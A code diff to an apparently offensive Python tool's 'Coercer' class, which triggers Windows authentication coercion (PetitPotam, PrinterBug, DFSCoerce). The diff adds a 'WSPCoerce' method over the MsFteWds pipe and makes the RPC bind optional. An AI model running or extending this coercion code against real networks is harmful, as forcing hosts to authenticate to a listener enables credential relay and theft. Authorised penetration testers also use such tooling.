@@ -105,7 +105,8 @@ class Coercer:
             "MS_DFSNM": "DFSCoerce",
             "MS_EFSR": "Petitpotam",
             "MS_RPRN": "PrinterBug",
-            "MS_EVEN": "CheeseOunce"
+            "MS_EVEN": "CheeseOunce",
+            "MS_WSP": "WSPCoerce"
         }
         config = {
             "MS_FSRVP": [
@@ -167,6 +168,13 @@ class Coercer:
                     "pipeName": "eventlog",
                     "MSRPC_UUID": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
                 },
+            ],
+            "MS_WSP": [
+                {
+                    "protocol": "ncacn_np",
+                    "pipeName": "MsFteWds",
+                    "MSRPC_UUID": "",
+                }
             ]
         }
         return config, alias
@@ -199,7 +207,8 @@ class Coercer:
         self.context.log.debug(f"Connecting to {stringBinding}")
         try:
             dce.connect()
-            dce.bind(uuidtup_to_bin(coerce_method["MSRPC_UUID"]))
+            if coerce_method["MSRPC_UUID"]:
+                dce.bind(uuidtup_to_bin(coerce_method["MSRPC_UUID"]))
         except Exception as e:
             self.context.log.debug(f"Something went wrong when connect to {stringBinding}, check error status => {e!s}")
             return None
@@ -211,7 +220,7 @@ class Coercer:
             ProtocolName = method.__package__
             CoerceMethod = method.__name__.split(".")[1]
             if ProtocolName == ms_protocolName:
-                self.context.log.debug(f"Sending {CoerceMethod}!")
+                self.context.log.debug(f"Target: {target}: Sending {CoerceMethod}!")
                 try:
                     method.request(dce, target, listener)
                 except Exception as e:
